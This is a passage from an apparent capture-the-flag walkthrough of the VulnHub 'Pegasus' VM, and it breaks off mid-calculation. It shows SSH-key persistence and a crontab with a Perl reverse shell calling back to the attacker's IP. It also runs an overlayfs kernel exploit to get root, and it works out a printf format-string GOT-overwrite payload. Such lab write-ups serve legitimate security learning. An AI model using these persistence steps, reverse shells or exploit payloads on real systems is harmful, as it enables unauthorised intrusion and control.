BuildID[sha1]=0xa7154888c18de2c173560b5a43d08856a538b357, not stripped</div></div><div><br/></div><div>When we run the program, we get a menu of options to select from...</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>mike@pegasus:~$ ./my_first </div><div>WELCOME TO MY FIRST TEST PROGRAM</div><div>--------------------------------</div><div>Select your tool:</div><div>[1] Calculator</div><div>[2] String replay</div><div>[3] String reverse</div><div>[4] Exit</div><div><div><br/></div></div><div>Selection:</div></div><div><br/></div><div>Testing the options, 1 takes two numbers and adds them, 2 takes a string and echoes it back, 3 is "not yet implemented" and 4 exits. Running ltrace on the program, we can see input is obtained with 'fgets' and output is written with 'printf'. I know printf can be abused to run arbitrary code, but I'm not a C expert, so I'll see if there is some lower hanging fruit before trying to hack this (see Additional Notes for full details on hacking printf).</div><div><br/></div><div><br/></div><div><h2>Maintaining Access</h2></div><div><br/></div><div>Since SSH is enabled on the victim and mike has a home directory and default shell...</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>mike@pegasus:/home/mike$ grep `whoami` /etc/passwd</div><div>mike:x:1001:1001:Mike Ross,,,:/home/mike:/bin/bash</div></div><div><br/></div><div>... I created an authorized_keys file and copied my SSH public key to the file. With this, I was able to SSH to the victim.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/pegasus# ssh -i pegasus mike@10.183.0.210</div><div>Welcome to Ubuntu 12.04.5 LTS (GNU/Linux 3.13.0-39-generic i686)</div><div><div><br/></div></div><div> * Documentation:  https://help.ubuntu.com/</div><div><div><br/></div></div><div>  System information as of Wed May  8 00:17:15 AEST 2019</div><div><div><br/></div></div><div>  System load:  0.0               Processes:           89</div><div>  Usage of /:   8.5% of 18.32GB   Users logged in:     0</div><div>  Memory usage: 17%               IP address for eth0: 10.183.0.210</div><div>  Swap usage:   0%</div><div><div><br/></div></div><div>  Graph this data and manage this system at:</div><div>    https://landscape.canonical.com/</div><div><div><br/></div></div><div>150 packages can be updated.</div><div>124 updates are security updates.</div><div><div><br/></div><div><br/></div></div><div>Your Hardware Enablement Stack (HWE) is supported until April 2017.</div><div><div><br/></div></div><div>You have mail.</div><div>Last login: Tue Dec 16 19:27:53 2014 from 172.16.246.129</div><div>mike@pegasus:~$</div></div><div><br/></div><div>After using SSH to connect to the victim, I installed a crontab for the user to continually try to connect back to my attacking machine on port 5433 (using a Perl reverse shell). Now, if I get discovered and shut out of SSH I can get back in with the reverse shell.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>SHELL=/bin/bash</div><div>PATH=/sbin:/bin:/usr/sbin:/usr/bin:/root/bin</div><div>MAILTO=root</div><div><br/></div><div># For details see man 4 crontabs</div><div><br/></div><div># Example of job definition:</div><div># .---------------- minute (0 - 59)</div><div># |  .------------- hour (0 - 23)</div><div># |  |  .---------- day of month (1 - 31)</div><div># |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...</div><div># |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat</div><div># |  |  |  |  |</div><div># *  *  *  *  * command to be executed</div><div><br/></div><div>#min hour day mon dow command</div><div>*/5    *    *   *   *   perl -e 'use Socket;$i="10.183.0.222";$p=5433;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/bash -i");};'</div></div><div><br/></div><div><br/></div><div><h2>Privilege Escalation</h2></div><div><br/></div><div>Checking the running kernel and OS...</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>mike@pegasus:~$ uname -a</div><div>Linux pegasus 3.13.0-39-generic #66~precise1-Ubuntu SMP Wed Oct 29 09:59:20 UTC 2014 i686 i686 i386 GNU/Linux</div><div>mike@pegasus:~$ cat /etc/os-release</div><div>NAME="Ubuntu"</div><div>VERSION="12.04.5 LTS, Precise Pangolin"</div><div>ID=ubuntu</div><div>ID_LIKE=debian</div><div>PRETTY_NAME="Ubuntu precise (12.04.5 LTS)"</div><div>VERSION_ID="12.04"</div></div><div><br/></div><div>We have a known privilege escalation vulnerability for our OS/kernel combo...</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation         | exploits/linux/local/37292.c</div></div><div><br/></div><div>I'll transfer the C file to the victim using netcat and see if we can compile and run it...</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>mike@pegasus:/tmp$ nc -vl 10.183.0.210 4321 &gt; 37292.c</div><div>Connection from 10.183.0.222 port 4321 [tcp/*] accepted</div><div>mike@pegasus:/tmp$ gcc -o pwn 37292.c</div><div>mike@pegasus:/tmp$ ./pwn</div><div>spawning threads</div><div>mount #1</div><div>mount #2</div><div>child threads done</div><div>/etc/ld.so.preload created</div><div>creating shared library</div><div># id</div><div>uid=0(root) gid=0(root) groups=0(root),1001(mike)</div></div><div><br/></div><div>That was easy. 😄</div><div><br/></div><div>Let's get the flag.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div># cd /root</div><div># cat flag</div><div>               ,</div><div>               |`\        </div><div>              /'_/_   </div><div>            ,'_/\_/\_                       ,   </div><div>          ,'_/\'_\_,/_                    ,'| </div><div>        ,'_/\_'_ \_ \_/                _,-'_/</div><div>      ,'_/'\_'_ \_ \'_,\           _,-'_,-/ \,      Pegasus is one of the best</div><div>    ,' /_\ _'_ \_ \'_,/       __,-'&lt;_,' _,\_,/      known creatures in Greek</div><div>   ( (' )\/(_ \_ \'_,\   __--' _,-_/_,-',_/ _\      mythology. He is a winged</div><div>    \_`\&gt; 6` 7  \'_,/ ,-' _,-,'\,_'_ \,_/'_,\       stallion usually depicted</div><div>     \/-  _/ 7 '/ _,' _/'\_  \,_'_ \_ \'_,/         as pure white in color.</div><div>      \_'/&gt;   7'_/' _/' \_ '\,_'_ \_ \'_,\          Symbol of wisdom and fame.</div><div>        &gt;/  _ ,V  ,&lt;  \__ '\,_'_ \_ \'_,/</div><div>      /'_  ( )_)\/-,',__ '\,_'_,\_,\'_\             Fun fact: Pegasus was also</div><div>     ( ) \_ \|_  `\_    \_,/'\,_'_,/'               a video game system sold in</div><div>      \\_  \_\_)    `\_                             Poland, Serbia and Bosnia.</div><div>       \_)   &gt;        `\_                           It was a hardware clone of</div><div>            /  `,      |`\_                         the Nintendo Famicom.</div><div>           /    \     / \ `\</div><div>          /   __/|   /  /  `\  </div><div>         (`  (   (` (_  \   /</div><div>         /  ,/    |  /  /   \</div><div>        / ,/      | /   \   `\_</div><div>      _/_/        |/    /__/,_/</div><div>     /_(         /_(</div><div>  </div><div>  </div><div>CONGRATULATIONS! You made it :)</div><div>  </div><div>Hope you enjoyed the challenge as much as I enjoyed creating it and I hope you</div><div>learnt a thing or two while doing it! :)</div><div>  </div><div>Massive thanks and a big shoutout to @iMulitia for beta-breaking my VM and</div><div>providing first review.</div><div>  </div><div>Feel free to hit me up on Twitter @TheKnapsy or at #vulnhub channel on freenode</div><div>and leave some feedback, I would love to hear from you!</div><div>  </div><div>Also, make sure to follow @VulnHub on Twitter and keep checking vulnhub.com for</div><div>more awesome boot2root VMs!</div></div><div><br/></div><div><br/></div><div><h2>Pivoting</h2></div><div>N/A</div><div><br/></div><div><br/></div><div><h2>Clean Up</h2></div><div><br/></div><div>*** REMOVE /home/mike/.ssh/authorized_keys ***</div><div>*** REMOVE crontab for mike ***</div><div>*** REMOVE 37292.c and pwn from /tmp ***</div><div><br/></div><div><br/></div><div><h2>Additional Info</h2></div><div><br/></div><div><b>printf Format String Attack</b></div><div><br/></div><div>Searching for vulnerabilities in the printf function of the 'my_first' program we found in /home/mike, I came across this write up by OWASP.</div><div><a href="https://www.owasp.org/index.php/Format_string_attack" target="_blank">https://www.owasp.org/index.php/Format_string_attack</a></div><div><br/></div><div>I was able to confirm the vulnerability using the following combination of python and pipe.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>mike@pegasus:~$ python -c 'print "1\n1\n%%\n1\n1\n%p\n1\n1\n%d\n1\n1\n%c\n1\n1\n%u\n1\n1\n%x\n1\n1\n%s\n1\n1\n%n\n"' | ./my_first</div><div>WELCOME TO MY FIRST TEST PROGRAM</div><div>--------------------------------</div><div>Select your tool:</div><div>[1] Calculator</div><div>[2] String replay</div><div>[3] String reverse</div><div>[4] Exit</div><div><div><br/></div></div><div>Selection: </div><div>Enter first number: Enter second number: Error details: %</div><div><div><br/></div></div><div>Selection: </div><div>Enter first number: Enter second number: Error details: 0xbffc36dc</div><div><div><br/></div></div><div>Selection: </div><div>Enter first number: Enter second number: Error details: -1073989924</div><div><div><br/></div></div><div>Selection: </div><div>Enter first number: Enter second number: Error details: �</div><div><div><br/></div></div><div>Selection: </div><div>Enter first number: Enter second number: Error details: 3220977372</div><div><div><br/></div></div><div>Selection: </div><div>Enter first number: Enter second number: Error details: bffc36dc</div><div><div><br/></div></div><div>Selection: </div><div>Enter first number: Enter second number: Error details: �6�%s</div><div><div><br/></div><div><br/></div></div><div>Selection: </div><div>Enter first number: Enter second number: Error details: </div><div><div><br/></div></div><div>Selection: </div><div>Error: Incorrect selection!</div><div><div><br/></div></div><div>Selection: </div><div>Bye!</div></div><div><br/></div><div>Using example two of the OWASP write up page, we were able to crash the application by sending a bunch of %s format strings.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>mike@pegasus:~$ ./my_first </div><div>WELCOME TO MY FIRST TEST PROGRAM</div><div>--------------------------------</div><div>Select your tool:</div><div>[1] Calculator</div><div>[2] String replay</div><div>[3] String reverse</div><div>[4] Exit</div><div><div><br/></div></div><div>Selection: 1</div><div><div><br/></div></div><div>Enter first number: 1</div><div>Enter second number: %s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s</div><div>Error details: `�¿%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s</div><div>Segmentation fault (core dumped)</div></div><div><br/></div><div>Now that we know we can crash the program, we know we might can manipulate its execution to run arbitrary commands/shell code for us. Time to transfer the binary to our attacking machine and do some debugging/exploit generation.</div><div><br/></div><div>Running (and crashing) our program in gdb (with the pwndbg plugin loaded... see below for details), we get the following...</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/pegasus# gdb -q ./my_first</div><div>pwndbg: loaded 174 commands. Type pwndbg [filter] for a list.</div><div>pwndbg: created $rebase, $ida gdb functions (can be used with print/break)</div><div>Reading symbols from ./my_first...(no debugging symbols found)...done.</div><div>pwndbg&gt; run</div><div>Starting program: /root/Walkthroughs/pegasus/my_first</div><div>WELCOME TO MY FIRST TEST PROGRAM</div><div>--------------------------------</div><div>Select your tool:</div><div>[1] Calculator</div><div>[2] String replay</div><div>[3] String reverse</div><div>[4] Exit</div><div><div><br/></div></div><div>Selection: 1</div><div><div><br/></div></div><div>Enter first number: 1</div><div>Enter second number: %s%s</div><div>Error details: ����%s%s</div><div><div><br/></div></div><div>Program received signal SIGSEGV, Segmentation fault.</div><div>__strlen_ia32 () at ../sysdeps/i386/i586/strlen.S:51</div><div>51      ../sysdeps/i386/i586/strlen.S: No such file or directory.</div><div>LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</div><div>────────────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────────────</div><div> EAX  0xa</div><div> EBX  0xffffcf5c ◂— 0xb83eda00</div><div> ECX  0xf7e11162 (vfprintf+2514) ◂— cmp    byte ptr [ebp - 0x488], 0</div><div> EDX  0x2</div><div> EDI  0xf7fa0000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1d9d6c</div><div> ESI  0xf7fa0d80 (_IO_2_1_stdout_) ◂— 0xfbad2a84</div><div> EBP  0xffffcf78 —▸ 0xffffd038 —▸ 0xffffd068 ◂— 0x0</div><div> ESP  0xffffca5c —▸ 0xf7e12787 (vfprintf+8183) ◂— add    esp, 0x10</div><div>EIP  0xf7e6059f (__strlen_ia32+15) ◂— cmp    byte ptr [eax], dh</div><div>──────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────────</div><div> ► 0xf7e6059f &lt;__strlen_ia32+15&gt;     cmp    byte ptr [eax], dh</div><div>   0xf7e605a1 &lt;__strlen_ia32+17&gt;     je     __strlen_ia32+182 &lt;0xf7e60646&gt;</div><div>    ↓   </div><div>   0xf7e60646 &lt;__strlen_ia32+182&gt;    sub    eax, dword ptr [esp + 4]</div><div>   0xf7e6064a &lt;__strlen_ia32+186&gt;    ret    </div><div><div><br/></div></div><div>   0xf7e6064b                        nop    </div><div>   0xf7e6064d                        nop    </div><div>   0xf7e6064f                        nop    </div><div>   0xf7e60650 &lt;__stpcpy_ia32&gt;        push   edi</div><div>   0xf7e60651 &lt;__stpcpy_ia32+1&gt;      push   esi</div><div>   0xf7e60652 &lt;__stpcpy_ia32+2&gt;      push   ebx</div><div>   0xf7e60653 &lt;__stpcpy_ia32+3&gt;      mov    edi, dword ptr [esp + 0x10]</div><div>──────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────</div><div>00:0000│ esp  0xffffca5c —▸ 0xf7e12787 (vfprintf+8183) ◂— add    esp, 0x10</div><div>01:0004│      0xffffca60 ◂— 0xa /* '\n' */</div><div>02:0008│      0xffffca64 —▸ 0xffffcfc2 ◂— 0xa7325 /* '%s\n' */</div><div>03:000c│      0xffffca68 ◂— 0x0</div><div>... ↓   </div><div>────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────</div><div> ► f 0 f7e6059f __strlen_ia32+15</div><div>   f 1 f7e12787 vfprintf+8183</div><div>   f 2 f7e18c86 <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">printf</font>+38</div><div>   f 3  80486df calculator+196</div><div>   f 4  80485dc main+208</div><div>   f 5 f7de0b41 __libc_start_main+241</div><div>Program received signal SIGSEGV (fault address 0xa)</div></div><div><br/></div><div>Checking the backtrace, we can see that the call to printf ultimately led to the crash. After some research and reading through these articles:</div><div><a href="https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html" target="_blank">https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html</a></div><div><a href="https://www.exploit-db.com/papers/13203" target="_blank">https://www.exploit-db.com/papers/13203</a></div><div><a href="http://www.cis.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf" target="_blank">http://www.cis.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf</a></div><div><a href="http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html" target="_blank">http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html</a></div><div><br/></div><div>I decided to try a GOT (Global Offset Table) overwrite attack.</div><div><br/></div><div>First, we need to find the address 'printf@plt' is jumping to.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>pwndbg&gt; disass 'printf@plt'</div><div>Dump of assembler code for function printf@plt:</div><div>   0x080483b0 &lt;+0&gt;:     jmp    DWORD PTR ds:<font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">0x8049bfc</font></div><div>   0x080483b6 &lt;+6&gt;:     push   0x0</div><div>   0x080483bb &lt;+11&gt;:    jmp    0x80483a0</div><div>End of assembler dump.</div></div><div><br/></div><div>If we check the memory location for that pointer, then disassemble that...</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>pwndbg&gt; x *<font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">0x8049bfc</font></div><div><font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">0xf7e18c60</font>:     0x0e5044e8</div><div>pwndbg&gt; disass <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">0xf7e18c60</font></div><div>Dump of assembler code for function __printf:</div><div>   0xf7e18c60 &lt;+0&gt;:     call   0xf7efdca9 &lt;__x86.get_pc_thunk.ax&gt;</div><div>   0xf7e18c65 &lt;+5&gt;:     add    eax,0x18739b</div><div>   0xf7e18c6a &lt;+10&gt;:    sub    esp,0xc</div><div>   0xf7e18c6d &lt;+13&gt;:    lea    edx,[esp+0x14]</div><div>   0xf7e18c71 &lt;+17&gt;:    sub    esp,0x4</div><div>   0xf7e18c74 &lt;+20&gt;:    push   edx</div><div>   0xf7e18c75 &lt;+21&gt;:    push   DWORD PTR [esp+0x18]</div><div>   0xf7e18c79 &lt;+25&gt;:    mov    eax,DWORD PTR [eax-0x78]</div><div>   0xf7e18c7f &lt;+31&gt;:    push   DWORD PTR [eax]</div><div>   0xf7e18c81 &lt;+33&gt;:    call   0xf7e10790 &lt;_IO_vfprintf_internal&gt;</div><div>   0xf7e18c86 &lt;+38&gt;:    add    esp,0x1c</div><div>   0xf7e18c89 &lt;+41&gt;:    ret    </div><div>End of assembler dump.</div></div><div><br/></div><div>Now we need to do some tests to see how to crawl back the stack to the address we want to rewrite. We'll do this by giving some 'A's and then popping pointers off the stack until we are back to our 'A's.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>pwndbg&gt; run</div><div>Starting program: /root/Walkthroughs/pegasus/my_first </div><div>WELCOME TO MY FIRST TEST PROGRAM</div><div>--------------------------------</div><div>Select your tool:</div><div>[1] Calculator</div><div>[2] String replay</div><div>[3] String reverse</div><div>[4] Exit</div><div><div><br/></div></div><div>Selection: 1</div><div><div><br/></div></div><div>Enter first number: 0</div><div>Enter second number: AAAA %p %p %p %p %p %p %p %p %p %p</div><div>Error details: AAAA 0xffffcfbc 0xa (nil) 0xf7fa05c0 0x1 (nil) 0xffffcfc0 <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">0x41414141</font> 0x20702520 0x25207025</div></div><div><br/></div><div>Using this technique, we can see we had to pop 7 references off the stack to get back to our 'A's. So, to go directly to our 'A's, we could do this.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>Enter first number: 0</div><div>Enter second number: AAAA%8$p         </div><div>Error details: AAAA0x41414141</div></div><div><br/></div><div>Now, combining this with the %n format operator...</div><div><br/></div><div>From <a href="https://www.owasp.org/index.php/Format_string_attack" target="_blank">https://www.owasp.org/index.php/Format_string_attack</a></div><div><img height="150" src="/assets/images/2019-05-06-pegasus-1/440D6CCC-108B-4029-9284-F1EA03A9896B.png" width="1138"/><br/></div><div><br/></div><div>From <a href="http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html" target="_blank">http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html</a></div><div><span style="font-style: italic;">%n = The number of characters written so far is stored into the integer indicated by the int * (or variant) pointer argument. No argument is converted.</span></div><div><br/></div><div>To explain, if we were to pass the string AAAA%8$n, we would write the value 4 (the "number of characters") to the address 0x41414141 (that address comes from us looking down the stack 8 spots to our AAAA).</div><div><br/></div><div>For our exploit, we want to change the 'printf@plt' pointer to point to the system command (0xf7e04b40)...</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>pwndbg&gt; print system</div><div>$1 = {int (const char *)} <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">0xf7e04b40</font> &lt;__libc_system&gt;</div></div><div><br/></div><div>... instead of the printf command (0xf7e18c60).</div><div><br/></div><div>To do that, we need to write 0xf7e04b40 to the address 0x8049bfc. Using a combination of our printf exploit techniques, here's what we want to send...</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>\xfc\x9b\x04\x08\xfe\x9b\x04\x08%19256x%8$hn%44192x%9$hn</div></div><div><br/></div><div>This breaks down to...</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>\xfc\x9b\x04\x08  (location for first two bytes/higher bytes, 0x8049bfc, reversed for little endian)</div><div>\xfe\x9b\x04\x08  (location for second two bytes/lower two bytes, 0x8049bfe, reversed for little endian)</div><div>%19256x           (generate our decimal value for %n, 0x4b40 = 19264 - 8)</div><div>%8$hn             (write higher two bytes to first location, 8 moves down the stack)</div><div>%44192x           (generate our decimal value for %n, 0xf7e0 = 63456 - 19264)</div><div>%9$hn             (write lower two bytes to second location, 9 moves down the stack)</div></div><div><br/></div><div>So, sending our "printf -&gt; system" rewrite results in the following.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/pegasus# python -c 'print "1\n0\n\xfc\x9b\x04\x08\xfe\x9b\x04\x08%19256x%8$hn%44192x%9$hn"' | ./my_first</div><div>WELCOME TO MY FIRST TEST PROGRAM  </div><div>--------------------------------  </div><div>Select your tool:</div><div>[1] Calculator</div><div>[2] String replay</div><div>[3] String reverse</div><div>[4] Exit</div><div><div><br/></div><div><br/></div></div><div>Selection:</div><div>Enter first number: Enter second number: Error details: �</div><div><br/></div><div>&lt;lots of blank space&gt;</div><div><br/></div><div><font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">sh: 1: Selection:: not found</font></div><div><div><br/></div></div><div>Bye!</div></div><div><br/></div><div>We successfully overwrote 'printf@plt' when the program tried to print what we entered into the calculator, so the next time the program tries to call printf (to ask for a new selection), it is actually passing that string to system instead of printf. 😄 Since there isn't a program in the $PATH called 'Selection:', the system call fails... but we can fix that.</div><div><br/></div><div>Now that we basically know what we are dealing with, we can move over to the victim and execute arbitrary system commands as 'john' (the SUID user of my_first).</div><div><br/></div><div>Before we can run our exploit on the victim, we need to disable ASLR (using ulimit) and then check the address for 'system' on the victim. We'll do this by running gdb on the victim, crashing the program and running 'print system'.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>mike@pegasus:~$ ulimit -s unlimited</div><div>mike@pegasus:~$ gdb -q my_first</div><div>Reading symbols from /home/mike/my_first...(no debugging symbols found)...done.</div><div>(gdb) run</div><div>Starting program: /home/mike/my_first </div><div>WELCOME TO MY FIRST TEST PROGRAM</div><div>--------------------------------</div><div>Select your tool:</div><div>[1] Calculator</div><div>[2] String replay</div><div>[3] String reverse</div><div>[4] Exit</div><div><div><br/></div></div><div>Selection: 1</div><div><div><br/></div></div><div>Enter first number: 0</div><div>Enter second number: %s%s</div><div>Error details: @���%s%s</div><div><div><br/></div></div><div>Program received signal SIGSEGV, Segmentation fault.</div><div>0x4006ea59 in vfprintf () from /lib/i386-linux-gnu/libc.so.6</div><div>(gdb) p system</div><div>$1 = {&lt;text variable, no debug info&gt;} <font style="color: rgb(147, 255, 5); --inversion-type-color: simple;">0x40069060</font> &lt;system&gt;</div></div><div><br/></div><div>We need to adjust our exploit string to overwrite printf with 0x40069060. Redoing our calculations...</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>\xfc\x9b\x04\x08  (location for first two bytes/higher bytes, 0x8049bfc, reversed for little endian)</div><div>\xfe\x9b\x04\x08  (location for second two bytes/lower two bytes, 0x8049bfe, reversed for little endian)</div><div><font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">%36952x           (generate our decimal value for %n, 0x9060 = 36960 - 8)</font></div><div>%8$hn             (write higher two bytes to first location, 8 moves down the stack)</div><div><font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">%44966x           (generate our decimal value for %n, 0x14006 = 81926 - 36960) # we added a 1 in front of our address so our value 